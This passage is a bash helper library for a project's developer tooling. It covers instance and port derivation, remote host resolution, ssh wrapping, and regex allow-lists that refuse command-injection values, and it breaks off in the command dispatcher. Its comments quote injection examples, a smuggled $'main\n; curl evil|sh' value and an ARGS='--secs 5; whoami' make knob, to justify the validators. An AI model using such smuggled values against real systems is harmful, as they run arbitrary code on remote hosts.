#!/usr/bin/env bash
# shellcheck shell=bash
#
# scripts/dx/common.sh — shared conventions for the Quasar DX tooling.
#
# Sourced by every scripts/dx/*.sh. Also executable directly for the few
# helpers the Makefile needs (see the dispatcher at the bottom):
#
#   scripts/dx/common.sh instance              # print QUASAR_INSTANCE
#   scripts/dx/common.sh ports                 # print the instance's port block
#   scripts/dx/common.sh env                   # print all derived DX_* as k=v
#   scripts/dx/common.sh require-local <t>     # rc 2 if HOST is not local
#   scripts/dx/common.sh resolve-remote <h>    # print DX_REMOTE_* for a role/host
#
# Output contract (every dx script):
#   PASS <check> — <hint>
#   WARN <check> — <hint>
#   FAIL <check> — <hint>
#   RESULT status=ok|degraded|failed target=<t> <k=v ...>      (exactly one, last)
# Exit codes: 0 = ok|degraded, 1 = failed, 2 = usage / guard violation.
#
# Secret hygiene: these scripts never print a secret VALUE. Names, yes; values,
# never — bundles go through scripts/dx/redact.sh.
#
# rtk note: always invoke go/cargo/docker/ssh DIRECTLY here. Wrapper proxies
# mask exit codes, and every check in this tree is exit-code driven.

set -euo pipefail

# ── Roots ────────────────────────────────────────────────────────────────────
DX_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# QUASAR_DX_ROOT lets the self-tests point the instance derivation at a fake
# worktree path without moving any files.
DX_ROOT="${QUASAR_DX_ROOT:-$(cd "$DX_DIR/../.." && pwd)}"
export DX_DIR DX_ROOT

# ── Instance identity ────────────────────────────────────────────────────────
# One worktree == one instance. The instance name is the compose project name
# and the seed for the port block, so two agents in two worktrees never collide
# on a container name, a volume, or a published port (generalizes #398).
dx_sha256() {
  if command -v shasum >/dev/null 2>&1; then
    printf '%s' "$1" | shasum -a 256 | awk '{print $1}'
  elif command -v sha256sum >/dev/null 2>&1; then
    printf '%s' "$1" | sha256sum | awk '{print $1}'
  else
    # Last-resort deterministic fallback; cksum is everywhere.
    printf '%s' "$1" | cksum | awk '{printf "%08x%08x", $1, $2}'
  fi
}

DX_ROOT_HASH="$(dx_sha256 "$DX_ROOT")"
# DX_INSTANCE_EXPLICIT mirrors the DX_HOST_EXPLICIT trick above: it records
# whether the OPERATOR set QUASAR_INSTANCE before we fill in the
# worktree-derived default, so a caller that needs per-invocation (not just
# per-worktree) isolation — scripts/dx/testdb.sh (#466) — can tell "pinned by
# the operator" apart from "defaulted".
DX_INSTANCE_EXPLICIT="${QUASAR_INSTANCE:-}"
QUASAR_INSTANCE="${QUASAR_INSTANCE:-dx-${DX_ROOT_HASH:0:8}}"
export QUASAR_INSTANCE DX_INSTANCE_EXPLICIT

# Deterministic port block. base + (hash % 1000) slots, 10 ports per slot so a
# single instance can publish several services without overlapping its neighbour.
DX_PORT_BASE="${QUASAR_DX_PORT_BASE:-21000}"
DX_PORT_SLOT=$(( 16#${DX_ROOT_HASH:0:4} % 1000 ))
DX_PORT_BLOCK=$(( DX_PORT_BASE + DX_PORT_SLOT * 10 ))
DX_CP_PORT="${DX_CP_PORT:-$DX_PORT_BLOCK}"
DX_CP_TLS_PORT="${DX_CP_TLS_PORT:-$(( DX_PORT_BLOCK + 1 ))}"
DX_PG_PORT="${DX_PG_PORT:-$(( DX_PORT_BLOCK + 2 ))}"
DX_TESTDB_PORT_HINT=$(( DX_PORT_BLOCK + 3 ))
export DX_PORT_BASE DX_PORT_SLOT DX_PORT_BLOCK DX_CP_PORT DX_CP_TLS_PORT DX_PG_PORT

# ── Paths ────────────────────────────────────────────────────────────────────
DX_LOCAL_COMPOSE="$DX_ROOT/deploy/overlays/docker-compose.local.yml"
DX_DIAG_DIR="${DX_DIAG_DIR:-$DX_ROOT/.diagnostics}"
# scripts/dx/uiaudit.sh evidence root — not committed, one dir per instance
# worktree (see .gitignore).
DX_UIAUDIT_DIR="${DX_UIAUDIT_DIR:-$DX_ROOT/.uiaudit}"
export DX_LOCAL_COMPOSE DX_DIAG_DIR DX_UIAUDIT_DIR

# ── Host scoping ─────────────────────────────────────────────────────────────
# HOST is deliberately NOT defaulted by the Makefile: an unset HOST is how the
# guards tell "the user asked for a remote host" apart from "it happened to be
# the default". QUASAR_DEFAULT_HOST exists so that distinction is testable.
DX_HOST_EXPLICIT="${HOST:-}"
DX_HOST="${DX_HOST_EXPLICIT:-${QUASAR_DEFAULT_HOST:-local}}"
export DX_HOST DX_HOST_EXPLICIT

# Hosts are addressed by ROLE (gpu-test/aux-infra/deploy-only) or by host name,
# resolved from the operator config the skills already use — never hardcode a
# real address/user/key/dir here. See .claude/skills/_shared/hosts.json
# (schema + placeholders in hosts.example.json). Overridable for tests.
DX_HOSTS_JSON="${DX_HOSTS_JSON:-$DX_ROOT/.claude/skills/_shared/hosts.json}"
export DX_HOSTS_JSON

# dx_resolve_remote <host-or-role>
#   Looks up DX_HOSTS_JSON (roles{} then hosts{}) and exports DX_REMOTE_*.
#   Individual QUASAR_REMOTE_HOST/USER/KEY/DIR env vars win over whatever was
#   resolved. Returns 1 (no output, no guard) if hosts.json is missing, python3
#   is unavailable, or the key resolves to nothing — callers decide how to
#   react (dx_guard for a hard failure, dx_warn for an advisory check).
dx_resolve_remote() {
  local key="$1"
  DX_REMOTE_NAME=""
  DX_REMOTE_SSH_ALIAS=""
  DX_REMOTE_HOST=""
  DX_REMOTE_USER=""
  DX_REMOTE_KEY=""
  DX_REMOTE_DIR=""
  DX_REMOTE_API=""
  DX_REMOTE_API_EXTERNAL=""
  DX_REMOTE_TLS_INSECURE=""
  DX_REMOTE_REDEPLOY_LABEL=""
  DX_REMOTE_COMPOSE_FILES=()

  [ -f "$DX_HOSTS_JSON" ] || return 1
  dx_have python3 || return 1

  local out
  out="$(python3 - "$DX_HOSTS_JSON" "$key" <<'PY'
import json, shlex, sys

path, key = sys.argv[1], sys.argv[2]
with open(path) as f:
    data = json.load(f)

roles = data.get("roles", {})
hosts = data.get("hosts", {})
name = roles.get(key, key)
h = hosts.get(name)
if h is None:
    sys.exit(1)

compose = h.get("compose_files") or ["docker-compose.yml"]

def q(s):
    return shlex.quote(s)

print("DX_REMOTE_NAME=%s" % q(name))
print("DX_REMOTE_SSH_ALIAS=%s" % q(h.get("ssh_alias", "")))
print("DX_REMOTE_HOST=%s" % q(h.get("ssh_host", "")))
print("DX_REMOTE_USER=%s" % q(h.get("ssh_user", "")))
print("DX_REMOTE_KEY=%s" % q(h.get("ssh_key", "")))
print("DX_REMOTE_DIR=%s" % q(h.get("dir", "")))
# `api` is the host-LOCAL control-plane URL (it is what the host itself can
# curl, published port included) — not the container port and not the LAN
# address. Health probes run over ssh ON the host, so this is the only URL
# that is correct there.
print("DX_REMOTE_API=%s" % q(h.get("api", "")))
print("DX_REMOTE_API_EXTERNAL=%s" % q(h.get("api_external", "")))
print("DX_REMOTE_TLS_INSECURE=%s" % q("1" if h.get("tls_insecure") else ""))
# redeploy.sh's FIRST argument is the hardware profile and it is mandatory —
# `bash deploy/redeploy.sh` with no argument prints usage and exits non-zero,
# which is how `make rebuild HOST=<host>` used to fail AFTER a successful
# (long) image build. Prefer the host's explicit redeploy_label; fall back to
# its gpu field, where anything that is not nvidia takes the VA path.
print("DX_REMOTE_REDEPLOY_LABEL=%s" % q(
    h.get("redeploy_label") or ("nvidia" if h.get("gpu") == "nvidia" else "va")))
print("DX_REMOTE_COMPOSE_FILES=(%s)" % " ".join(q(c) for c in compose))
PY
  )" || return 1

  eval "$out"

  DX_REMOTE_HOST="${QUASAR_REMOTE_HOST:-$DX_REMOTE_HOST}"
  DX_REMOTE_USER="${QUASAR_REMOTE_USER:-$DX_REMOTE_USER}"
  DX_REMOTE_KEY="${QUASAR_REMOTE_KEY:-$DX_REMOTE_KEY}"
  DX_REMOTE_DIR="${QUASAR_REMOTE_DIR:-$DX_REMOTE_DIR}"
  DX_REMOTE_API="${QUASAR_REMOTE_API:-$DX_REMOTE_API}"
  DX_REMOTE_API_EXTERNAL="${QUASAR_REMOTE_API_EXTERNAL:-$DX_REMOTE_API_EXTERNAL}"
  [ -n "$DX_REMOTE_API_EXTERNAL" ] || DX_REMOTE_API_EXTERNAL="$DX_REMOTE_API"
  DX_REMOTE_KEY="${DX_REMOTE_KEY/#\~/$HOME}"

  # THE CHOKE POINT for every host-derived value that later lands in a remote
  # command string. `dir`, `api` and the redeploy label are interpolated into
  # `ssh <host> "cd '$DX_REMOTE_DIR' && ..."` by a dozen call sites across
  # stack/diagnose/homes_gc/admin_token/nightly_budget/qa — validating each of
  # those is a list that goes stale, so validate once, here, where they are
  # born. hosts.json is operator-local rather than hostile, but a `'` reaching
  # any of those call sites is remote code execution as the fleet ssh account,
  # and that is not a property worth leaving to the care taken editing a JSON
  # file. The ssh target/user are checked too: a leading `-` makes ssh read the
  # value as an option instead of a destination.
  local _t="resolve-remote"
  dx_require_safe "$_t" "hosts.json dir for $DX_REMOTE_NAME" "$DX_REMOTE_DIR" "$DX_RE_ABSPATH" \
    "It must be a plain absolute path."
  [ -z "$DX_REMOTE_API" ] || dx_require_safe "$_t" "hosts.json api for $DX_REMOTE_NAME" \
    "$DX_REMOTE_API" "$DX_RE_URL" "It must be a plain http(s) base URL."
  [ -z "$DX_REMOTE_API_EXTERNAL" ] || dx_require_safe "$_t" "hosts.json api_external for $DX_REMOTE_NAME" \
    "$DX_REMOTE_API_EXTERNAL" "$DX_RE_URL" "It must be a plain http(s) base URL."
  [ -z "$DX_REMOTE_REDEPLOY_LABEL" ] || dx_require_safe "$_t" "redeploy label for $DX_REMOTE_NAME" \
    "$DX_REMOTE_REDEPLOY_LABEL" "$DX_RE_NAME" "Expected va or nvidia."
  [ -z "${DX_REMOTE_SSH_ALIAS:-}" ] || dx_require_safe "$_t" "hosts.json ssh_alias for $DX_REMOTE_NAME" \
    "$DX_REMOTE_SSH_ALIAS" "$DX_RE_SSH_TARGET"
  [ -z "${DX_REMOTE_HOST:-}" ] || dx_require_safe "$_t" "hosts.json ssh_host for $DX_REMOTE_NAME" \
    "$DX_REMOTE_HOST" "$DX_RE_SSH_TARGET"
  [ -z "${DX_REMOTE_USER:-}" ] || dx_require_safe "$_t" "hosts.json user for $DX_REMOTE_NAME" \
    "$DX_REMOTE_USER" "$DX_RE_SSH_TARGET"

  export DX_REMOTE_NAME DX_REMOTE_SSH_ALIAS DX_REMOTE_HOST DX_REMOTE_USER DX_REMOTE_KEY DX_REMOTE_DIR DX_REMOTE_API DX_REMOTE_API_EXTERNAL DX_REMOTE_TLS_INSECURE DX_REMOTE_REDEPLOY_LABEL
  return 0
}

# dx_ssh_remote <cmd...> — ssh to whatever dx_resolve_remote last resolved.
# ssh_alias hosts go through the alias verbatim (no -i); ssh_host hosts use key
# auth with IdentityAgent=none — load-bearing, without it an interactive agent
# (e.g. 1Password) intercepts the key exchange and hangs ~60s then fails.
dx_ssh_remote() {
  if [ -n "${DX_REMOTE_SSH_ALIAS:-}" ]; then
    ssh -o ConnectTimeout="${DX_SSH_TIMEOUT:-10}" -o BatchMode=yes \
        -o StrictHostKeyChecking=accept-new "$DX_REMOTE_SSH_ALIAS" "$@"
  else
    ssh -o IdentityAgent=none -o ConnectTimeout="${DX_SSH_TIMEOUT:-10}" \
        -o BatchMode=yes -o StrictHostKeyChecking=accept-new \
        -i "$DX_REMOTE_KEY" "${DX_REMOTE_USER}@${DX_REMOTE_HOST}" "$@"
  fi
}

# ── Reporting ────────────────────────────────────────────────────────────────
DX_PASS_N=0
DX_WARN_N=0
DX_FAIL_N=0

dx_pass() { DX_PASS_N=$((DX_PASS_N + 1)); printf 'PASS %s — %s\n' "$1" "${2:-ok}"; }
dx_warn() { DX_WARN_N=$((DX_WARN_N + 1)); printf 'WARN %s — %s\n' "$1" "${2:-}"; }
dx_fail() { DX_FAIL_N=$((DX_FAIL_N + 1)); printf 'FAIL %s — %s\n' "$1" "${2:-}" >&2; }
dx_info() { printf '     %s\n' "$*"; }

# dx_result <target> [k=v ...] — prints the single terminal RESULT line and exits.
dx_result() {
  local target="$1"; shift || true
  local status="ok"
  if [ "$DX_FAIL_N" -gt 0 ]; then
    status="failed"
  elif [ "$DX_WARN_N" -gt 0 ]; then
    status="degraded"
  fi
  printf 'RESULT status=%s target=%s host=%s instance=%s pass=%d warn=%d fail=%d' \
    "$status" "$target" "$DX_HOST" "$QUASAR_INSTANCE" "$DX_PASS_N" "$DX_WARN_N" "$DX_FAIL_N"
  local kv
  for kv in "$@"; do printf ' %s' "$kv"; done
  printf '\n'
  if [ "$status" = "failed" ]; then exit 1; fi
  exit 0
}

# dx_guard <target> <hint> — a usage error or a refused guard. Always rc 2.
dx_guard() {
  local target="$1" hint="$2"
  printf 'FAIL guard — %s\n' "$hint" >&2
  printf 'RESULT status=failed target=%s host=%s instance=%s pass=0 warn=0 fail=1 guard=refused\n' \
    "$target" "$DX_HOST" "$QUASAR_INSTANCE"
  exit 2
}

# ── Remote-command argument safety ───────────────────────────────────────────
#
# Every remote command in this layer is a STRING handed to the remote login
# shell, so anything interpolated into one is CODE, not data. The single quotes
# these call sites wrap values in are not protection: one `'` in the value
# closes them and the remainder runs as the fleet ssh account — which has docker
# access, i.e. host root. `$(...)` and a bare newline do the same job.
#
# So a value must be proven safe BEFORE it reaches a remote command string.
# These validators whitelist a conservative shape and REFUSE anything else.
# Refuse, never sanitize: silently rewriting an operator's `REF` into a
# different ref that then gets CHECKED OUT AND DEPLOYED is worse than stopping.
#
# The regexes are matched with bash `=~`, deliberately, not `grep -Eq`: grep
# matches per LINE, so a value like $'main\n; curl evil|sh' would pass a grep
# check on the strength of its first line while carrying a whole second command.
# `=~` anchors against the entire string, newline included.

# A git ref as this repo ever legitimately uses one: branch, tag, or sha.
# No quotes, no spaces, no `$`, no backtick, no newline, no leading `-` (which a
# remote command would read as an option rather than a value).
DX_RE_REF='^[A-Za-z0-9][A-Za-z0-9._/@+-]*$'
# A UUID session id, or the literal `latest` before it is resolved.
DX_RE_SID='^([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}|latest)$'
# A docker/compose service or container name.
DX_RE_NAME='^[A-Za-z0-9][A-Za-z0-9._-]*$'
# A `docker logs --since` value: a duration (10m, 2h30m) or an RFC3339 stamp.
DX_RE_SINCE='^[0-9A-Za-z:+.-]+$'
# An absolute path with no shell metacharacters — for the remote repo dir.
DX_RE_ABSPATH='^/[A-Za-z0-9._/-]*$'
# A path evaluated on the REMOTE host, where a leading literal `$HOME` is
# deliberately left for the remote shell to expand. That one expansion is the
# only `$` allowed — anything else, `$(...)` included, is refused.
DX_RE_REMOTE_PATH='^(\$HOME)?/[A-Za-z0-9._/-]+$'
# An http(s) base URL, no credentials, no query, no metacharacters.
DX_RE_URL='^https?://[A-Za-z0-9._:/-]+$'
# A hostname, ssh alias, or login name used as an ssh ARGUMENT. A leading `-`
# would be read by ssh as an option rather than a destination.
DX_RE_SSH_TARGET='^[A-Za-z0-9][A-Za-z0-9._@-]*$'
# A docker image reference (`repo/name:tag`, optionally digest-pinned).
DX_RE_IMAGE='^[A-Za-z0-9][A-Za-z0-9._:/@-]*$'
# A bearer token: JWT / base64url, i.e. no quote, no space, no metacharacter.
DX_RE_TOKEN='^[A-Za-z0-9._~+/=-]+$'
# A positive integer — for the many `--tail N` / line-count knobs, most of which
# reach remote commands UNQUOTED and so need no quote at all to inject.
DX_RE_UINT='^[0-9]+$'
# One argument arriving through a Makefile passthrough knob (ARGS, SID). The
# knob is a list of ordinary flags and values, so the allow-list is generous
# about path/glob/URL punctuation and refuses only what makes a token CODE:
# quotes, `$`, backtick, `;`, `&`, `|`, `<`, `>`, `(`, `)`, `\`, `!` and
# whitespace. `]` is left out on the same grounds bench_run.sh leaves it out of
# its glob check — no knob has ever needed one. Ordering inside the bracket
# expression is load-bearing: `^` is not first, `-` is last.
DX_RE_ARG='^[A-Za-z0-9._,:=+@%^~/*?{}[-]+$'
# Every one of these is consumed by a script that SOURCES this file. That use is
# invisible to a linter reading this file alone, so they are exported: it makes
# the use explicit instead of needing an SC2034 suppression on each line.
# (Keep the word "shellcheck" out of the start of a comment line — it is read as
# a directive and fails the whole file's parse.)
export DX_RE_REF DX_RE_SID DX_RE_NAME DX_RE_SINCE DX_RE_ABSPATH DX_RE_REMOTE_PATH \
       DX_RE_URL DX_RE_SSH_TARGET DX_RE_IMAGE DX_RE_TOKEN DX_RE_UINT DX_RE_ARG

# dx_is_safe <value> <regex-variable-value> — 0 when the value matches whole.
dx_is_safe() {
  local value="$1" re="$2"
  [[ "$value" =~ $re ]]
}

# dx_require_safe <target> <name> <value> <regex> [hint]
# Guards (rc 2) unless the value is safe to interpolate into a remote command.
dx_require_safe() {
  local target="$1" name="$2" value="$3" re="$4" hint="${5:-}"
  if ! dx_is_safe "$value" "$re"; then
    dx_guard "$target" "$name='$value' is not a shape this tooling will send to a remote shell.${hint:+ $hint} (Refused rather than quoted: values reach the remote host as part of a command string, so a quote, \$(...), backtick or newline in one executes there as the fleet ssh account.)"
  fi
}

# ── Makefile passthrough knobs (ARGS, SID, …) ────────────────────────────────
#
# The Makefile must never interpolate a caller-settable value into a recipe
# line (#550). Make expands `$(ARGS)` into the recipe's command TEXT, and
# /bin/bash then parses that text, so `make bench-run ARGS='--secs 5; whoami'`
# ran `whoami` at the MAKE layer — before any script existed to check it. The
# double quotes some recipes wrapped a value in were not protection either: a
# `"` closes them and a backtick is live inside them.
#
# Make already exports every command-line variable into the recipe's
# environment (GNU make manual §5.7.2), and an environment variable is never
# re-parsed by a shell. So the Makefile passes the knobs by ENVIRONMENT and the
# script turns them back into arguments here.
DX_ARGV=()

# dx_env_argv <target> <VAR>... — set DX_ARGV from the named environment
# variables, in order, each split on whitespace into separate arguments.
#
# Bash word splitting EVALUATES NOTHING: `;`, `&&`, `$(...)`, backticks and
# newlines all survive as ordinary characters inside a token. Globbing is off
# for the split, so `*` stays literal too. That alone neutralises the make-layer
# hole — a payload becomes an unknown option rather than a command.
#
# Each token is then shape-checked anyway, because "did not execute here" is not
# "safe to forward": several of these scripts build a REMOTE command string out
# of a parsed value, where a metacharacter is code again, and a payload with no
# whitespace in it survives the split as a single token.
dx_env_argv() {
  local target="$1"; shift
  DX_ARGV=()
  local had_noglob=0
  case "$-" in *f*) had_noglob=1 ;; esac
  set -f
  local name value tok
  for name in "$@"; do
    value="${!name:-}"
    [ -n "$value" ] || continue
    local parts
    # shellcheck disable=SC2206  # deliberate: IFS word splitting, no evaluation
    parts=($value)
    for tok in ${parts[@]+"${parts[@]}"}; do
      dx_require_safe "$target" "$name" "$tok" "$DX_RE_ARG" \
        "A make knob is a list of plain flags and values; it is split into arguments, never run as a command. A quote, \$, backtick, \`;\`, \`&\`, \`|\` or redirection in one has no legitimate use here."
      DX_ARGV+=("$tok")
    done
  done
  [ "$had_noglob" = 1 ] || set +f
}

# dx_sanitize_admin_token <target> — normalize $QSES_ADMIN_TOKEN in place.
#
# The classic trap (#508): the per-host token cache
# ${XDG_CACHE_HOME:-~/.cache}/quasar/<host>.token (written by admin_token.sh)
# is a TWO-LINE file — expiry epoch on line 1, the bearer token on line 2.
# Consuming it with a bare `cat ~/.cache/quasar/<host>.token` (instead of
# `make admin-token HOST=<host>`, which prints ONLY the bare token) embeds a
# newline into QSES_ADMIN_TOKEN. Every curl built from that value then dies
# with `curl: (43) A libcurl function was given a bad argument` -> http_code
# 000 — which upstream call sites have historically swallowed exactly like a
# 401 (empty running_sids, "could not resolve exactly one host", a misleading
# launch FAIL minutes into a run instead of an immediate, actionable one).
#
# A bearer token never legitimately contains whitespace, so this strips every
# whitespace character (space/tab/CR/LF) unconditionally, warns that it did
# so, and then hard-fails if anything non-printable survives — belt (silently
# fix the common case) and suspenders (refuse to hand a still-broken value to
# curl). This does NOT validate the token is otherwise correct; pair it with
# an authenticated preflight call to catch a well-formed-but-wrong token.
dx_sanitize_admin_token() {
  local target="$1"
  local raw="${QSES_ADMIN_TOKEN:-}"
  [ -n "$raw" ] || return 0
  local sanitized
  sanitized="$(printf '%s' "$raw" | tr -d '[:space:]')"
  if [ "$sanitized" != "$raw" ]; then
    dx_warn admin-token "QSES_ADMIN_TOKEN contained whitespace/newline characters — stripped for this run. This is the classic two-line ~/.cache/quasar/<host>.token cache-file trap (line 1 = expiry epoch, line 2 = token); a bare 'cat' of that file embeds a newline. Mint cleanly with: make admin-token HOST=<host> (prints the bare token only)."
  fi
  case "$sanitized" in
    *[![:print:]]*)
      dx_guard "$target" "QSES_ADMIN_TOKEN still contains non-printable characters after stripping whitespace — not usable as an HTTP header value. Likely the two-line ~/.cache/quasar/<host>.token cache-file trap (expiry epoch on line 1, token on line 2) hit via something other than a plain newline. Re-mint with: make admin-token HOST=<host> ARGS='--fresh'"
      ;;
  esac
  # Printable is not the same as safe. Six call sites build a REMOTE command
  # around this value — bench_run.sh's four host_curl helpers, bench_suite.sh's
  # host_api, session_soak.sh's driver export — all of the form
  # `ssh <host> "curl ... -H 'Authorization: Bearer $QSES_ADMIN_TOKEN'"`. The
  # single quotes there are not protection: a `'` in the token closes them and
  # the rest of it runs as the fleet ssh account. A JWT is base64url plus dots,
  # so a token carrying a quote, a backtick or a `$` is malformed regardless —
  # refuse it rather than forward it into a remote shell.
  dx_require_safe "$target" "QSES_ADMIN_TOKEN" "$sanitized" "$DX_RE_TOKEN" \
    "A bearer token is base64url text; this one carries characters that are not. Re-mint with: make admin-token HOST=<host> ARGS='--fresh'"
  QSES_ADMIN_TOKEN="$sanitized"
}

# ── Guards ───────────────────────────────────────────────────────────────────
DX_REMOTE_VERBS="status health logs logs-follow rebuild redeploy-cp up down restart abr-ladder bench-run bench-suite nightly-budget-install nightly-budget-run nightly-budget-status qa homes-gc codec-validate session-list session-verdict session-metrics session-trace session-bundle session-logs session-diagnose admin-token report-publish report-attach report-url"
# abr-ladder shapes the REMOTE host's own network egress (qnetem sender) for the
# duration of the run — that is a mutation of host state exactly like up/down/
# restart/rebuild, so it gets the same "you must TYPE HOST=<host>" guard rather
# than silently inheriting a remote from QUASAR_DEFAULT_HOST.
# bench-run LAUNCHES a session (and optionally shapes egress); bench-suite also
# PATCHes the host's ABR settings between cells. Both mutate host state.
# nightly-budget-install writes a crontab line; nightly-budget-run launches a
# real bench-mode session (scripts/dx/nightly_budget_ctl.sh). Both mutate host
# state the same way up/down/rebuild do; nightly-budget-status is read-only.
# `qa` is remote-only by nature (it validates an image on a real GPU stack) and
# mutating (it repoints an app at the candidate image, then restores it), so it
# is in both lists — HOST must be typed, never inherited.
# homes-gc DELETES managed-home directories on the remote host (#500) — the most
# irreversible thing in this list, so it also requires a typed HOST. Its
# --dry-run is a flag on the same verb, not a separate read-only verb, so that
# an operator cannot reach the destructive form by dropping an argument from a
# command they got used to typing without HOST.
# redeploy-cp replaces the control-plane container on a real host and runs its
# embedded migrations — narrower than `rebuild`, but no less a mutation of that
# host, so it takes the same typed-HOST guard.
# codec-validate LAUNCHES real sessions per codec cell (and tears them down) —
# session-mutating like bench-run, so HOST must be typed.
DX_REMOTE_MUTATING_VERBS="up down restart rebuild redeploy-cp abr-ladder bench-run bench-suite nightly-budget-install nightly-budget-run qa homes-gc codec-validate"
# Escape hatch used only by the self-tests to exercise the allow-list without
# also tripping the explicit-HOST check. Never set this in real use.
DX_REMOTE_EXEMPT_EXPLICIT="${DX_REMOTE_EXEMPT_EXPLICIT:-0}"

dx_word_in() { # dx_word_in <word> <space-separated-list>
  case " $2 " in *" $1 "*) return 0 ;; *) return 1 ;; esac
}

# Reject anything that is not "local" or a role/host name resolvable in
# DX_HOSTS_JSON. Also the point where DX_REMOTE_* gets populated for any
# script that goes on to use dx_ssh_remote / dx_announce_remote_delegation.
dx_require_known_host() {
  local target="$1"
  [ "$DX_HOST" = "local" ] && return 0
  if [ ! -f "$DX_HOSTS_JSON" ]; then
    dx_guard "$target" "configure .claude/skills/_shared/hosts.json (see hosts.example.json)"
  fi
  dx_resolve_remote "$DX_HOST" || dx_guard "$target" \
    "HOST='$DX_HOST' is not a known role or host (see .claude/skills/_shared/hosts.json)"
}

# Local-only target: refuses any non-local HOST.
dx_require_local() {
  local target="$1"
  dx_require_known_host "$target"
  if [ "$DX_HOST" != "local" ]; then
    dx_guard "$target" "'$target' is local-only; HOST=$DX_HOST is not supported for it"
  fi
}

# A target that MAY run against a remote host. Enforces the allow-list and,
# for the mutating verbs, that the operator TYPED HOST=<host> rather than
# inheriting it from QUASAR_DEFAULT_HOST.
dx_require_host_scope() {
  local target="$1"
  dx_require_known_host "$target"
  [ "$DX_HOST" != "local" ] || return 0
  if ! dx_word_in "$target" "$DX_REMOTE_VERBS"; then
    dx_guard "$target" "HOST=$DX_HOST is only allowed for: $DX_REMOTE_VERBS"
  fi
  if dx_word_in "$target" "$DX_REMOTE_MUTATING_VERBS" && [ "$DX_REMOTE_EXEMPT_EXPLICIT" != "1" ]; then
    if [ -z "$DX_HOST_EXPLICIT" ]; then
      dx_guard "$target" \
        "'$target' mutates a remote host; it refuses to run unless you pass HOST=<host> explicitly (got HOST='<unset>')"
    fi
  fi
}

# dx_remote_compose_args — DX_REMOTE_COMPOSE_FILES as `-f <file>` args, with any
# leading "deploy/" stripped (compose_files[] in hosts.json is repo-relative;
# the remote compose invocation's cwd is $DX_REMOTE_DIR/deploy — see 716f309b).
dx_remote_compose_args() {
  local f
  for f in "${DX_REMOTE_COMPOSE_FILES[@]}"; do
    printf -- '-f %s ' "${f#deploy/}"
  done
}

# Announce, for every mutating remote verb, which canonical script owns the
# work. Requires DX_REMOTE_* to already be resolved (dx_require_host_scope).
dx_announce_remote_delegation() {
  case "$1" in
    rebuild)
      dx_info "$DX_REMOTE_NAME rebuild delegates to: deploy/build-images.sh (build) + deploy/redeploy.sh (deploy)" ;;
    redeploy-cp)
      dx_info "$DX_REMOTE_NAME redeploy-cp delegates to: deploy/redeploy.sh <profile> <ref> control (no image build)" ;;
    up|down|restart)
      dx_info "$DX_REMOTE_NAME $1 delegates to: docker compose $(dx_remote_compose_args)$1 (over ssh, in $DX_REMOTE_DIR/deploy)" ;;
  esac
}

# ── Small utilities ──────────────────────────────────────────────────────────
dx_have() { command -v "$1" >/dev/null 2>&1; }

# dx_free_port [start] — first port at/above start that nothing can be bound on.
dx_free_port() {
  local start="${1:-$DX_TESTDB_PORT_HINT}" port
  for (( port = start; port < start + 200; port++ )); do
    if dx_port_bindable "$port"; then printf '%s\n' "$port"; return 0; fi
  done
  return 1
}

dx_port_bindable() {
  local port="$1"
  if dx_have python3; then
    if python3 - "$port" <<'PY'
import socket, sys
s = socket.socket()
try:
    s.bind(("127.0.0.1", int(sys.argv[1])))
except OSError:
    sys.exit(1)
finally:
    s.close()
PY
    then return 0; else return 1; fi
  fi
  # Fallback: a successful connect means something is listening.
  if (exec 3<>"/dev/tcp/127.0.0.1/$port") 2>/dev/null; then
    exec 3>&- 2>/dev/null || true
    return 1
  fi
  return 0
}

dx_timestamp() { date -u +%Y%m%dT%H%M%SZ; }

# Local compose invocation, always project-scoped to this instance.
dx_local_compose() {
  docker compose -p "$QUASAR_INSTANCE" -f "$DX_LOCAL_COMPOSE" "$@"
}

# ── Direct-execution dispatcher ──────────────────────────────────────────────
if [ "${BASH_SOURCE[0]}" = "$0" ]; then
  case "${1:-}" in
    instance) printf '%s\n' "$QUASAR_INSTANCE" ;;
    ports)
      printf 'cp=%s tls=%s pg=%s block=%s\n' \
        "$DX_CP_PORT" "$DX_CP_TLS_PORT" "$DX_PG_PORT" "$DX_PORT_BLOCK" ;;
    env)
      printf 'QUASAR_INSTANCE=%s\n' "$QUASAR_INSTANCE"
      printf 'DX_ROOT=%s\n' "$DX_ROOT"
      printf 'DX_PORT_BLOCK=%s\n' "$DX_PORT_BLOCK"
      printf 'DX_CP_PORT=%s\n' "$DX_CP_PORT"
      printf 'DX_CP_TLS_PORT=%s\n' "$DX_CP_TLS_PORT"
      printf 'DX_PG_PORT=%s\n' "$DX_PG_PORT" ;;
    require-local)
      [ -n "${2:-}" ] || { printf 'usage: common.sh require-local <target>\n' >&2; exit 2; }
      dx_require_local "$2" ;;
    require-host-scope)
      [ -n "${2:-}" ] || { printf 'usage: common.sh require-host-scope <target>\n' >&2; exit 2; }
      dx_require_host_scope "$2" ;;
    resolve-remote)
      [ -n "${2:-}" ] || { printf 'usage: common.sh resolve-remote <host-or-role>\n' >&2; exit 2; }
      if dx_resolve_remote "$2"; then
        printf 'DX_REMOTE_NAME=%s\n' "$DX_REMOTE_NAME"
        printf 'DX_REMOTE_SSH_ALIAS=%s\n' "$DX_REMOTE_SSH_ALIAS"
        printf 'DX_REMOTE_HOST=%s\n' "$DX_REMOTE_HOST"
        printf 'DX_REMOTE_USER=%s\n' "$DX_REMOTE_USER"
        printf 'DX_REMOTE_KEY=%s\n' "$DX_REMOTE_KEY"
        printf 'DX_REMOTE_DIR=%s\n' "$DX_REMOTE_DIR"
        printf 'DX_REMOTE_API=%s\n' "$DX_REMOTE_API"
        printf 'DX_REMOTE_API_EXTERNAL=%s\n' "$DX_REMOTE_API_EXTERNAL"
        printf 'DX_REMOTE_COMPOSE_FILES=%s\n' "${DX_REMOTE_COMPOSE_FILES[*]}"
      else
        printf 'resolve-remote: %s not found in %s\n' "$2" "$DX_HOSTS_JSON" >&2
        exit 2
      fi ;;
    # Exposed so scripts/dx/tests/run.sh can assert the refusal directly; the
    # real callers source this file and call the function.
    sanitize-admin-token)
      [ -n "${2:-}" ] || { printf 'usage: common.sh sanitize-admin-token <target>\n' >&2; exit 2; }
      dx_sanitize_admin_token "$2"
      printf '%s\n' "${QSES_ADMIN_TOKEN:-}" ;;
    # Also exposed for the suite: prints one resolved argument per line, so a
    # test can assert both the refusal AND that a legitimate knob still splits
    # into the arguments the script will receive.
    env-argv)
